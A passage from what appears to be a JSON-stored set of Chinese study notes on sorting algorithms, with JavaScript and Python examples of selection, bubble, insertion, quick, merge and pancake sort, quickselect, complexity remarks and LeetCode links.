5, 9, 2, 6]\nnumbers.sort()\nprint(numbers)  # 输出: [1, 1, 2, 3, 4, 5, 6, 9]\n\n# 降序排列\nnumbers.sort(reverse=True)\nprint(numbers)  # 输出: [9, 6, 5, 4, 3, 2, 1, 1]\n```\n\n#### 2.1.2. `sorted()` 函数\n\n   - 这是一个内置函数，可以对任何可迭代对象进行排序。\n   - 它返回一个新的排序后的列表，不修改原对象。\n   - 默认按升序排列。\n\n示例：\n\n```python\nnumbers = [3, 1, 4, 1, 5, 9, 2, 6]\nsorted_numbers = sorted(numbers)\nprint(sorted_numbers)  # 输出: [1, 1, 2, 3, 4, 5, 6, 9]\nprint(numbers)  # 原列表不变，输出: [3, 1, 4, 1, 5, 9, 2, 6]\n\n# 降序排列\nsorted_numbers_desc = sorted(numbers, reverse=True)\nprint(sorted_numbers_desc)  # 输出: [9, 6, 5, 4, 3, 2, 1, 1]\n```\n\n### 2.2. JavaScript 排序方法\n\nJavaScript 主要使用 `Array.prototype.sort()` 方法进行排序。\n\n- 这个方法会直接修改原数组。\n- 默认情况下，`sort()` 方法按**字符串顺序排序**，这可能导致数字排序出现问题。\n\n示例：\n\n```javascript\n// 简单使用\nlet fruits = ['banana', 'apple', 'orange', 'mango'];\nfruits.sort();\nconsole.log(fruits); // 输出: ['apple', 'banana', 'mango', 'orange']\n\n// 数字排序（升序）\nlet numbers = [3, 1, 4, 1, 5, 9, 2, 6];\nnumbers.sort((a, b) => a - b);\nconsole.log(numbers); // 输出: [1, 1, 2, 3, 4, 5, 6, 9]\n\n// 数字排序（降序）\nnumbers.sort((a, b) => b - a);\nconsole.log(numbers); // 输出: [9, 6, 5, 4, 3, 2, 1, 1]\n```\n\n在 JavaScript 中，`sort()` 方法可以接受一个比较函数作为参数，这使得我们可以自定义排序逻辑。\n\n#### 2.2.1. 总结\n\n- `a-b` 升序\n- `b-a` 降序\n\n## 3. 选择排序\n\n```javascript hl:26\n/**\n * @param {*} arr  待排序数组\n * @returns arr 排序后的数组\n * 选择排序步骤：\n * 1. 选取区间 [0,len-1] 中的最小元素，将其与 索引 0 处的元素交换。\n *    完成后，数组前 1 个元素已排序\n * 2. 选取区间 [1,len-1] 中的最小元素，将其与 索引 1 处的元素交换。\n *    完成后，数组前 2 个元素已排序\n * 3. 重复上述步骤，直到区间 [len-2,len-1] 中的最小元素与 索引 len-2 处的元素交换。\n *    完成后，数组前 len-1 个元素已排序\n */\nfunction selectSort(arr) {\n  let len = arr.length;\n  for (let i = 0; i < len - 1; i++) {\n    // 假设当前下标为最小值, 与后面的元素比较, 如果有更小的, 则交换\n    let minIndex = i;\n    // j = i + 1, 从当前元素的下一个元素开始比较\n    for (let j = i + 1; j < len; j++) {\n      if (arr[j] < arr[minIndex]) {\n        minIndex = j;\n      }\n    }\n\n    // 如果最小值不是当前元素, 则交换\n    if (minIndex !== i) {\n      [arr[i], arr[minIndex]] = [arr[minIndex], arr[i]];\n    }\n  }\n  return arr;\n}\n```\n\n### 3.1. 分析\n\n- 原地排序\n- 非稳定排序，如下图\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240927082355.png)\n\n## 4. 冒泡排序\n\n1. 首先，对 n 个元素执行“冒泡”，将数组的`最大元素`交换至正确位置。\n2. 接下来，对剩余 n−1 个元素执行“冒泡”，将`第二大元素`交换至正确位置。\n3. 以此类推，经过 n−1 轮“冒泡”后，`前 n−1 大的元素`都被交换至正确位置。\n4. 仅剩的一个元素必定是最小元素，无须排序，因此数组排序完成。\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240927083448.png)\n\n```javascript\nfunction bubbleSort(arr) {\n  let len = arr.length;\n  for (let i = 0; i < len; i++) {\n    // j < len - 1 - i 是因为每次冒泡都会将最大的数冒泡到最后\n    // 所以每次冒泡都会将一个数排好序，所以不需要再次比较\n    // 所以 -i\n    for (let j = 0; j < len - 1 - i; j++) {\n      // 如果前一个数比后一个数大，则交换位置\n      // 否则，不做任何操作\n      if (arr[j] > arr[j + 1]) {\n        let temp = arr[j];\n        arr[j] = arr[j + 1];\n        arr[j + 1] = temp;\n      }\n    }\n  }\n  return arr;\n}\n\n```\n\n### 4.1. 注意点\n\n- `i < len`\n- `i < len - 1  - i `\n\t- 其实直接 `j < len` 也行啊\n\t- `len - 1` 是因为我们比较相邻元素，所以最后一个元素 (index `len - 1`) 会和它前面的元素比较，不需要单独比较\n- 最里层的循环，都使用 `j` \n\n### 4.2. 分析\n\n- 冒泡是\n\t- 稳定的\n\t- 原地的\n\n## 5. 插入排序\n\n1. 初始状态下，数组的**第 1 个**元素已完成排序。\n2. 选取数组的**第 2 个**元素作为 `base` ，将其插入到正确位置后，**数组的前 2 个元素已排序**。\n3. 选取**第 3 个**元素作为 `base` ，将其插入到正确位置后，**数组的前 3 个元素已排序**。\n4. 以此类推，在最后一轮中，选取最后一个元素作为 `base` ，将其插入到正确位置后，**所有元素均已排序**。\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240927211304.png)\n\n```javascript\nfunction insertSort(arr) {\n  let len = arr.length;\n  for (let i = 1; i < len; i++) {\n    // 从第二个元素开始\n    let base = arr[i];\n    // 需要遍历已排序的部分，找到合适的位置插入\n    // 从后往前遍历\n    // j 为已排序部分的最后一个元素\n    let j = i - 1;\n    // 如果已排序部分的元素大于 base，则将元素后移\n    while (j >= 0 && arr[j] > base) {\n      arr[j + 1] = arr[j];\n      j--;\n    }\n    // 移动完毕，插入 base即可\n    arr[j + 1] = base;\n  }\n}\n\n```\n\n### 5.1. 注意点\n\n- ①  for 外层， while 内层\n\t- `j = i - 1`  \n\t\t- 因为 `j` 为已排序的最后一个数的下标\n\t\t- 而 `i` 代表最后第几个元素之前已经排号序了\n- ② 从后向前遍历已经排序的数组，如果发现需要插入，整体后移\n- ③ 移动完毕，然后插入当前的 `base` 即可\n\n### 5.2. 分析\n\n- 稳定的，因为整体移动，不会改变相对顺序\n- 原地的\n\n## 6. 快排\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240927212535.png)\n\n```javascript hl:7\nfunction quickSort(arr) {\n  // base case: 数组为空或只包含一个元素时\n  if (arr.length <= 1) {\n    return arr;\n  }\n  var midIndex = Math.floor(arr.length / 2);\n  var mid = arr.splice(midIndex, 1)[0];\n  \n  var left = [];\n  var right = [];\n  for (var i = 0; i < arr.length; i++) {\n    if (arr[i] < mid) {\n      left.push(arr[i]);\n    } else {\n      right.push(arr[i]);\n    }\n  }\n  return quickSort(left).concat([mid], quickSort(right));\n}\n```\n\n### 6.1. 注意点\n\n- 没有洗牌\n- 使用数组的 `splice` 方法，\n- 使用数组的 `concat` 方法\n- 非原地排序\n- 非稳定算法\n\n## 7. 归并排序\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240928110206.png)\n\n```javascript\nfunction mergeSort(arr) {\n  // base case: 数组为空或只包含一个元素时\n  if (arr.length < 2) {\n    return arr;\n  }\n  const middle = Math.floor(arr.length / 2);\n  const left = arr.slice(0, middle);\n  const right = arr.slice(middle);\n  return merge(mergeSort(left), mergeSort(right));\n}\n\n/**\n * @description: 合并两个有序数组\n * @param {Array} left 左数组，有序\n * @param {Array} right 右数组，有序\n */\nfunction merge(left, right) {\n  const result = [];\n  // 两个数组都有值\n  while (left.length && right.length) {\n    // 两个数组的第一个元素进行比较\n    // 小的元素出队列，放入结果数组\n    if (left[0] <= right[0]) {\n      result.push(left.shift());\n    } else {\n      result.push(right.shift());\n    }\n  }\n  // 两个数组有一个为空, 另一个不为空\n  while (left.length) {\n    result.push(left.shift());\n  }\n  while (right.length) {\n    result.push(right.shift());\n  }\n  return result;\n}\n\n```\n\n### 7.1. 注意点\n\n- 合并两个有序数组，所谓有序，只有一个数组那肯定是有序的\n- 注意是使用 `shift` ，队首出队\n- 曾几何时，使用各种 `while` 把直接绕进去了，现在绕进去了吗？\n- 稳定的\n- 非原地的\n\n","Eu1dKB34":"\n# 快速排序算法的原理及运用\n\n`#算法/快排` `#2024/09/16`  `#算法/排序`\n\n\n## 目录\n<!-- toc -->\n ## 1. 快排算法 \n### 1.1. 一句话总结快排算法\n\n快速排序是**先将**一个元素排好序，然后再将**剩下的元素**排好序\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240916104326.png)\n\n> 这就像是在整理一大堆杂乱的物品，我们先选一个标准，把物品分成两堆，然后再分别整理这两堆，如此反复，最终就能得到一个井然有序的结果。\n### 1.2. 快排就是构造 BST 的过程\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/快速排序.gif|432)\n\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240916104516.png)\n\n--- \n\n一种极端场景：你不可能每次都选中了**合适的切分点**吧，比如上图中的 `4` ，所以如果有一边的元素特别少的话，会导致二叉树生长不平衡，如下图：\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240917105205.png)\n\n所以需要**随机性**，两种方法\n- 洗牌数组\n- 随机选中**切分点**\n\n> 经过随机化的 `partition` 函数很难出现极端情况\n\n### 1.3. 快排与二叉树的遍历的关系\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240917132719.png)\n\n### 1.4. 代码实现一：简单实现\n\n```javascript\nvar quickSort = function (nums) {\n  if (nums.length <= 1) {\n    return nums;\n  }\n\n  let midIndex = Math.floor(nums.length / 2);\n\n  let left = [];\n  let right = [];\n  let mid = [];\n\n  let midValue = nums[midIndex];\n  // 从数组中删除中间值\n  nums.splice(midIndex, 1);\n  for (let i = 0; i < nums.length; i++) {\n    if (nums[i] < midValue) {\n      left.push(nums[i]);\n    } else if (nums[i] > midValue) {\n      right.push(nums[i]);\n    } else {\n      mid.push(nums[i]);\n    }\n  }\n\n  //**********************\n  //  前序位置\n  //**********************\n  let sortLeft = quickSort(left);\n  let sortRight = quickSort(right);\n\n  return [...sortLeft, ...mid, ...sortRight];\n};\n\n/**\n * @param {number[]} nums\n * @param {number} k\n * @return {number}\n */\nvar findKthLargest = function (nums, k) {\n  let sorted = quickSort(nums);\n  return sorted[sorted.length - k];\n};\n\n```\n\n#### 1.4.1. 复杂度分析\n\n1. 时间复杂度：\n\t- 快速排序的平均时间复杂度是 O(n log n)，其中 n 是数组的长度。\n\t- 最坏情况下（当数组已经排序或者接近排序时），时间复杂度可能退化到 O(n^2)。\n\t- 最坏情况时间复杂度：O(n^2)\n\t- 总的平均时间复杂度：O(n log n)\n2. 空间复杂度：\n   - 快速排序的空间复杂度主要来自**递归调用栈**和创建的新数组。\n   - 平均情况下，递归深度为 O(log n)。\n   - 每次递归都创建了新的 left、right 和 mid 数组，最坏情况下可能需要 `O(n)` 的额外空间。\n   - 总的空间复杂度：O(n log n)\n   - 最坏情况空间复杂度：O(n^2)\n3. 额外说明：\n   - 这个实现使用了额外的数组空间，而**不是原地排序**，这增加了空间复杂度。\n   - 对于找第k大元素的问题，其实不需要完全排序数组，可以使用快速选择算法（QuickSelect）来优化，使平均时间复杂度降低到 O(n)。\n4. 优化建议：\n   - 可以考虑使用原地快速排序来减少空间使用。\n\n### 1.5. 代码实现二：原地排序\n\n> [!danger]\n> 说实话，完全写出来还是挺难的，掌握原理就行了，能够写出来成本收益又如何呢？\n\n```javascript\nvar quickSort = function (nums) {\n  // 为了避免出现耗时的极端情况，先随机打乱\n  shuffle(nums);\n  // 排序整个数组（原地修改）\n  sort(nums, 0, nums.length - 1);\n};\n\n// 洗牌算法，将输入的数组随机打乱\nvar shuffle = function (nums) {\n  for (let i = nums.length - 1; i > 0; i--) {\n    const j = Math.floor(Math.random() * (i + 1));\n    // ES6 的解构赋值\n    [nums[i], nums[j]] = [nums[j], nums[i]];\n  }\n};\n\nvar sort = function (nums, lo, hi) {\n  // 递归的终止条件, lo >= hi 时返回\n  if (lo >= hi) {\n    return;\n  }\n  // 对 nums[lo..hi] 进行切分\n  // 使得 nums[lo..p-1] <= nums[p] < nums[p+1..hi]\n  var p = partition(nums, lo, hi);\n  sort(nums, lo, p - 1);\n  sort(nums, p + 1, hi);\n};\n\n/**\n *@description 对数组 nums 的子区间 [lo, hi] 进行切分操作\n *   从[lo,hi]中x选择 pivot = nums[lo] 作为切分点\n *      将小于 pivot 的元素放在左侧，大于 pivot 的元素放在右侧\n *@param {number[]} nums 待切分的数组\n *@param {number} lo 切分的左边界\n *@param {number} hi 切分的右边界\n *@return {number} 返回 p, 使得 nums[lo..p-1] <= nums[p] < nums[p+1..hi]\n */\nvar partition = function (nums, lo, hi) {\n  var pivot = nums[lo];\n  var i = lo + 1, // i 从 lo + 1 开始，逐渐向右逼近\n    j = hi; // j 从 hi 开始,逐渐向左逼近\n  // 当 i > j 时结束循环，以保证区间 [lo, hi] 都被覆盖\n  while (i <= j) {\n    while (i < hi && nums[i] <= pivot) {\n      i++;\n      // 此 while 结束时恰好 nums[i] > pivot\n    }\n    while (j > lo && nums[j] > pivot) {\n      j--;\n      // 此 while 结束时恰好 nums[j] <= pivot\n    }\n\n    // 这个时候可以自己跳出循环了\n    if (i >= j) {\n      break;\n    }\n    // 此时 [lo, i) <= pivot && (j, hi] > pivot\n    // 交换 nums[j] 和 nums[i]\n    [nums[i], nums[j]] = [nums[j], nums[i]];\n    // 此时 [lo, i] <= pivot && [j, hi] > pivot\n  }\n  // 最后将 pivot 放到合适的位置，即 pivot 左边元素较小，右边元素较大\n  [nums[lo], nums[j]] = [nums[j], nums[lo]];\n  return j;\n};\n```\n\n## 2. 快速选择算法\n\n快速选择算法是一种用于**找到数组中第k小（或第k大）元素**的高效算法。它的思想源自于快速排序算法，但通常比完整的排序更快，因为它只需要部分排序数组。\n\n让我们深入了解快速选择算法：\n\n1. 算法概述：\n   快速选择的主要思想是使用类似快速排序的分区策略，但只递归地搜索包含第k小元素的那一部分。\n2. 算法步骤：\n   a. 选择一个基准元素（pivot）\n   b. 将数组分区，使得小于基准的元素在左边，大于基准的元素在右边\n   c. 根据分区位置和k的关系，决定是返回结果，还是继续在左边或右边递归查找\n3. JavaScript 实现：\n\n```javascript\nfunction quickSelect(arr, k) {\n    // k应该在1到arr.length之间\n    if (k < 1 || k > arr.length) {\n        return null;\n    }\n    return select(arr, 0, arr.length - 1, k);\n}\n\nfunction select(arr, left, right, k) {\n    // 如果左右指针相遇，说明找到了第k小的元素\n    if (left === right) {\n        return arr[left];\n    }\n    \n    // 选择基准并分区\n    let pivotIndex = partition(arr, left, right);\n    \n    // 计算基准的秩（即它是第几小的元素）\n    let rank = pivotIndex - left + 1;\n    \n    if (k === rank) {\n        // 如果基准的秩正好是k，那么它就是第k小的元素\n        return arr[pivotIndex];\n    } else if (k < rank) {\n        // 如果k小于rank，在左半部分继续查找\n        return select(arr, left, pivotIndex - 1, k);\n    } else {\n        // 如果k大于rank，在右半部分继续查找\n        return select(arr, pivotIndex + 1, right, k - rank);\n    }\n}\n\nfunction partition(arr, left, right) {\n    let pivot = arr[right]; // 选择最右边的元素作为基准\n    let i = left - 1;\n    \n    for (let j = left; j < right; j++) {\n        if (arr[j] <= pivot) {\n            i++;\n            [arr[i], arr[j]] = [arr[j], arr[i]]; // 交换元素\n        }\n    }\n    \n    [arr[i + 1], arr[right]] = [arr[right], arr[i + 1]]; // 将基准放到正确的位置\n    return i + 1;\n}\n\n// 使用示例\nlet arr = [3, 2, 1, 5, 6, 4];\nconsole.log(quickSelect(arr, 2)); // 输出：2（第2小的元素）\nconsole.log(quickSelect(arr, 4)); // 输出：4（第4小的元素）\n```\n\n4. 算法分析：\n   - 时间复杂度：\n     * 平均情况：O(n)\n     * 最坏情况：O(n²)（但这种情况很少发生，尤其是如果我们随机选择基准）\n   - 空间复杂度：O(1)，因为它是原地操作的\n5. 优点：\n   - 在平均情况下，它比排序整个数组然后选择第k个元素要快得多\n   - 它是一个原地算法，不需要额外的空间\n   - 对于大型数据集寻找中位数或者其他百分位数非常有效\n6. 应用场景：\n   - 寻找数组中的中位数\n   - 寻找第k大（或第k小）的元素\n   - 解决 Top K 问题\n   - 在某些数据流算法中用于维护运行时的统计信息\n7. 优化：\n   - 使用随机选择基准可以进一步改善最坏情况的性能\n   - 对于小规模子数组，可以切换到插入排序等简单算法来提高效率\n\n快速选择算法是一个强大而优雅的算法，它展示了如何通过只解决问题的一部分来高效地得到答案。理解和掌握这个算法不仅能帮助解决特定的问题，还能提供一种解决更广泛问题的思路。\n\n## 3. 相关题目\n\n|LeetCode|力扣|难度|\n|---|---|---|\n|[215. Kth Largest Element in an Array](https://leetcode.com/problems/kth-largest-element-in-an-array/)|[215. 数组中的第K个最大元素](https://leetcode.cn/problems/kth-largest-element-in-an-array/)|🟠|\n|[912. Sort an Array](https://leetcode.com/problems/sort-an-array/)|[912. 排序数组](https://leetcode.cn/problems/sort-an-array/)|🟠|\n|-|[剑指 Offer II 076. 数组中的第 k 大的数字](https://leetcode.cn/problems/xx4gT2/)|🟠|\n\n## 4. 参考\n\nhttps://labuladong.online/algo/practice-in-action/quick-sort/\n","lPTNhyn5":"\n# 排序算法（高级）\n\n`#算法` `#排序`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 堆排序 \n\n`建堆`操作 和 元素`出堆`操作  实现`堆排序`\n1. 输入数组并建立`小顶堆`，此时最小元素位于堆顶。\n2. 不断执行`出堆`操作，依次记录出堆元素，即可得到从小到大排序的序列。\n\n是`非稳定`\n\n\n## 2. 桶排序\n\n- 桶排序适用于处理`体量很大的数据`\n- 注意下图中颜色\n- **非原地排序**：需要借助 k 个桶和总共 n 个元素的额外空间\n- 桶排序**是否稳定**取决于排序桶内元素的算法是否稳定\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240928113826.png)\n\n## 3. 计数排序：整数数组\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240928114041.png)\n\n- 只针对非负整数\n- 非原地的\n- 稳定的？看具体实现，如果倒序遍历 `nums` 可以避免改变相等元素之间的相对位置\n\n## 4. 基数排序\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240928121628.png)\n\n## 5. 对比\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240928121734.png)\n","BVAbiP9r":"\n# 深入理解快速排序\n\n\n`#算法/排序`\n\n\n## 目录\n<!-- toc -->\n ## 快速排序 \n\n### 一句话总结 `快排排序` \n\n- `一句话总结`了归并排序：\n\t- 先把`左半边数组`排好序\n\t\t- base case：`lo === hi`\n\t- 再把`右半边数组`排好序\n\t\t-  base case：`lo === hi`\n\t- 然后把两半数组`合并`\n\t\t- `merge` 两个有序数组\n- 那么，一句话总结 `快排` 呢？\n\t- `先将一个元素排好序`，\n\t- 然后再将`剩下的元素`排好序。如何理解？如下图：\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/6b859d6a4f606a9b67f4a8709d846c4d.png)\n\n\n###  `快速排序`的过程是一个 `构造二叉搜索树`的过程\n\n看下图就明白了：\n\n![1.gif](https://832-1310531898.cos.ap-beijing.myqcloud.com/3badc5c4acc77559a890b8727b5d3b8a.gif)\n\n最后，可不就是一个`二叉搜索树`吗？如下图\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/bebbe199c49050edc38883000dd8e5b3.png)\n\n\n构造时，如果运气特别不好，构造出一个`特别不平衡的二叉树` ，如下图，`解决方案`是：构造前洗牌数组先。\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/2347ca1cb56ea865f2b4fd67c83226c4.png)\n\n\n### 如何理解快速排序是 `二叉树前序遍历` ? \n\n看动图，这不就是 `二叉树的前序遍历` 吗？\n\n![1.gif](https://832-1310531898.cos.ap-beijing.myqcloud.com/3badc5c4acc77559a890b8727b5d3b8a.gif)\n\n再看`代码框架`\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/729c31fd9d52a3db6fae97365c74e347.png)\n\n> 上面代码 `p 、 p-1 、 p+1` 分别都有具体含义的！\n\n### 实现方式1：js的简易实现\n\n```javascript\n// 1、找基准值，然后分成两个数组\n// 2、与该基准点数据比较，如果比它小，放左边；反之，放右边。\n// 3、左右分别用一个空数组去存储比较后的数据。\n// 4、最后递归执行上述操作，直到数组长度 <= 1\nconst quickSort1 = arr => {\n    if (arr.length <= 1) {\n        return arr;\n    }\n    // 取基准点\n    const midIndex = Math.floor(arr.length / 2);\n    // 取基准点的值，splice(index,1) 则返回的是含有被删除的元素的数组。\n    const midIndexVal = arr.splice(midIndex, 1)[0];\n    const left = []; // 存放比基准点小的数组\n    const right = []; // 存放比基准点大的数组\n    // 遍历数组，进行判断分配\n    for (let i = 0; i < arr.length; i++) {\n        if (arr[i] < midIndexVal) {\n            left.push(arr[i]); //比基准点小的放在左边数组\n        } else {\n            right.push(arr[i]); //比基准点大的放在右边数组\n        }\n    }\n    //递归执行以上操作，对左右两个数组进行操作，直到数组长度为 <= 1\n    return quickSort1(left).concat(midIndexVal, quickSort1(right));\n};\nconst array2 = [5, 4, 3, 2, 1];\nconsole.log('quickSort1 ', quickSort1(array2));\n\n```\n\n使用 `splice` 就行分割，然后最后递归，遍历\n\n另外，该实现没有完全参考上面的代码模板，使用了JavaScript 一些语言特性，但是，没有解决 前序遍历构造二叉树搜索树时，`运气特别差`的场景。\n\n#### 算法复杂时分析\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/04672262505df16cb349fab68a47b775.png)\n\n\n### 实现方式2：套用上面的模板，todo\n\n\n## 使用快排思路，实现找到数组中第`k`大元素\n\n[Loading Question... - 力扣（LeetCode）](https://leetcode.cn/problems/kth-largest-element-in-an-array/)\n\n## 快排与归并排序的对比\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/bf815141e6fa6394b88af03dc7f2cc05.png)\n\n- `归并排序` 是 `自下而上` 的，占用内存高些，没法原地，但 **稳定**\n- 快排 是 自下而上的，他分解`子问题`，原地排序，不稳定\n\n\n\n","NtKD1Sk9":"\n# 深入理解归并排序\n\n\n`#算法/排序` \n\n\n所有`递归`的算法，本质上都是在遍历一棵（递归）树，然后在节点（前中后序位置）上执行代码，你要写递归算法，本质上就是要告诉每个节点需要做什么。\n\n\n## 目录\n<!-- toc -->\n ## 如何理解`归归排序`是`二叉树的后序遍历` \n\n- 首先，一句话描述 归并排序？\n\t- 先把`左半边数组`排好序，再把`右半边数组`排好序，最后`merge` 两个有序数组。\n\n下图是，遍历通过`二叉树遍历思路`，即非线性的方式，二叉树的前序遍历，来遍历数组，然后再离开节点的时候，做merge操作，如下图：\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/347117ca1383f1435bdc75dd5a50aa2b.png)\n\n下面是 merge 的`动图`：\n\n![4.gif](https://832-1310531898.cos.ap-beijing.myqcloud.com/c6b314119f840e94f23b110c6f04cc72.gif)\n\n完全流程：`先`拆解，拆到叶子节点，`然后`再merge ，如下图：\n\n![image.png|675](https://832-1310531898.cos.ap-beijing.myqcloud.com/e9bf2abb5511f922a3c70ef49e278d4d.png)\n\n\n### 代码部分\n\n测试用例：看 [ 力扣（LeetCode）](https://leetcode.cn/problems/sort-an-array/)\n\n```javascript\n/**\n * https://leetcode.cn/problems/sort-an-array/\n * */\n\nfunction sort(nums, left, right) {\n    if (left === right) {\n        return;\n    }\n    const mid = Math.floor((left + right) / 2);\n    // 利用定义，排序 nums[left..mid]\n    sort(nums, left, mid);\n    // 利用定义，排序 nums[mid+1..right]\n    sort(nums, mid + 1, right);\n    // ::::后序位置::::\n    /*************************************************\n     * ::::即，此时两部分子数组已经被排好序\n     * ::::   合并两个有序数组，使 nums[left..right] 有序\n     ************************************************/\n    merge(nums, left, mid, right);\n}\n\n// 使用 【数组双指针技巧】，合并两个有序数组\nfunction merge(nums, left, mid, right) {\n    //  copy 到 temp 数组\n    // ::::notice 不是 temp=[...nums]\n    const temp = []\n    for (let i = left; i <= right; i++) {\n        temp[i] = nums[i];\n    }\n    //// ::::使用 【数组双指针技巧】，合并两个有序数组\n    let i = left, j = mid + 1;\n    for (let p = left; p <= right; p++) {\n        // 左半边数组已全部被合并\n        if (i === mid + 1) { // :::: notice i === mid + 1    \n            nums[p] = temp[j++];\n         // 右半边数组已全部被合并   \n        } else if (j === right + 1) {\n            nums[p] = temp[i++];\n        } else if (temp[i] > temp[j]) {\n            nums[p] = temp[j++];\n        } else {\n            nums[p] = temp[i++];\n        }\n    }\n};\n\nconst arr = [5, 12, 13, 14, 4, 3, 15, 16, 2, 1, 2, 0, 2, 3, 9, 10, 11, 9, 17, 18, 19, 20, 21, 22];\nsort(arr, 0, arr.length - 1);\nconsole.log(arr);\n\n```\n\n- 都是`原地`排序\n- 注意，`sort` 和 `merge` 函数的`入参`分别是什么？\n\n### 真正理解上面代码的`双指针技巧`吗？\n\n对于 `merge` 的双指针，不一定真的的理解，下面梳理下：\n\n以下图为例：\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/a3cde51c1457f331092c5bb9fbed1230.png)\n\n总之:\n- 都是原地直接修改 `nums`\n- left , right , mid 都是递归函数传入的，固定的\n- `双指针`根据 `left` 和 `mid` 来初始化\n- `左指针i` 根据 `mid` 来判断 边界条件\n- `j右指针`  根据 `right` 来判断判断边界条件\n\n> [!info]\n> 对于 `递归的理解`，还是一样，记住`模板`搞就是了，小脑袋瓜子，能递归几次？\n\n### 另外一种解法：使用 `js` 的语法特性\n\n```javascript\nconst mergeSort = arr => {\n    // 采用自上而下的递归方法\n    const len = arr.length;\n    // 递归条件\n    if (len < 2) {\n        return arr;\n    }\n    let middle = Math.floor(len / 2),\n        left = arr.slice(0, middle),\n        right = arr.slice(middle); // 拆分为两个子数组\n\n    const leftArr = mergeSort(left);\n    const rightArr = mergeSort(right);\n    \n    // ::::后序位置\n    return merge(leftArr, rightArr);\n};\n\n// 合并两个已经排好序的数组，无论left或者right里有多少元素\nconst merge = (left, right) => {\n    const result = [];\n    // :::: left和right都有元素，这判断大小后，取最小的放入结果集，注意使用shift了的副作用\n    while (left.length && right.length) {\n        //// :::: 注意: 判断的条件是小于或等于，如果只是小于，那么排序将不稳定.\n        if (left[0] <= right[0]) {\n            result.push(left.shift());\n        } else {\n            result.push(right.shift());\n        }\n    }\n    // 走到这里，说明left和right其中一个为空，另一个不为空，遍历剩下的元素，放入结果集\n    // :::: 每次都取最小的放入结果集，注意使用shift了的副作用\n    while (left.length) result.push(left.shift());\n    while (right.length) result.push(right.shift());\n    return result;\n};\n\nconst array = [5, 4, 3, 2, 1, 32, 2, 1, 0];\nconsole.log('mergeSort ', mergeSort(array));\n\n```\n\n> [!bug]\n> 当初面试，就写不出来，不知道是 `shift` ，还是 `left` ,`right` 这几个变傻分不清了\n\n### 下面，分析一下复杂度\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/9a65219541e4465dd0511a68ce401a66.png)\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/c5edbd21aa83ab7bc69c4efc19d786d1.png)\n\n## 应用1：力扣第 315 题「 计算右侧小于当前元素的个数」\n\n\n## 应用2：力扣第 493 题「 翻转对」\n\n\n## 应用3：力扣第 327 题「 区间和的个数」\n\n\n## 参考\n\n[归并排序详解及应用 :: labuladong的算法小抄](https://labuladong.github.io/algo/di-yi-zhan-da78c/shou-ba-sh-66994/gui-bing-p-1387f/)\n[912. 排序数组 - 力扣（LeetCode）](https://leetcode.cn/problems/sort-an-array/)\n","LOrcdAwY":"\n# 煎饼排序\n\n\n| LeetCode                                                               | 力扣                                                         | 难度  |\n| ---------------------------------------------------------------------- | ---------------------------------------------------------- | --- |\n| [969. Pancake Sorting](https://leetcode.com/problems/pancake-sorting/) | [969. 煎饼排序](https://leetcode.cn/problems/pancake-sorting/) | 🟠  |\n\n![图片&文件](./files/20241119-3.png)\n\n\n## 目录\n<!-- toc -->\n ## 思路：递归遍历 \n\n假设有数组 `[3, 2, 4, 1]`，我们要将其排序为 `[1, 2, 3, 4]`：\n\n1. 第一轮（i = 4）：\n    - 找到最大值4，位置在索引2\n    - 翻转前3个元素：`[4, 2, 3, 1]`\n    - 翻转前4个元素：`[1, 3, 2, 4]`\n    - 4已经到达正确位置\n2. 第二轮（i = 3）：\n    - 找到最大值3，位置在索引1\n    - 翻转前2个元素：`[3, 1, 2, 4]`\n    - 翻转前3个元素：`[2, 1, 3, 4]`\n    - 3 已经到达正确位置\n3. 第三轮（i = 2）：\n    - 找到最大值2，位置在索引0\n    - 翻转前2个元素：`[1, 2, 3, 4]`\n    - 2已经到达正确位置\n最终数组已经排序完成：`[1, 2, 3, 4]`\n\n\n## 代码\n\n```javascript hl:26,20,23\nvar pancakeSort = function (cakes) {\n  // 记录反转操作序列\n  const res = [];\n  /**\n   * @param 需要排序的cakes 烧饼列表\n   * @param n 反转第几个？\n   */\n  const sort = function (cakes, n) {\n    // base case\n    if (n == 1) return;\n    // 寻找最大饼的索引\n    let maxCake = 0;\n    let maxCakeIndex = 0;\n    for (let i = 0; i < n; i++) {\n      if (cakes[i] > 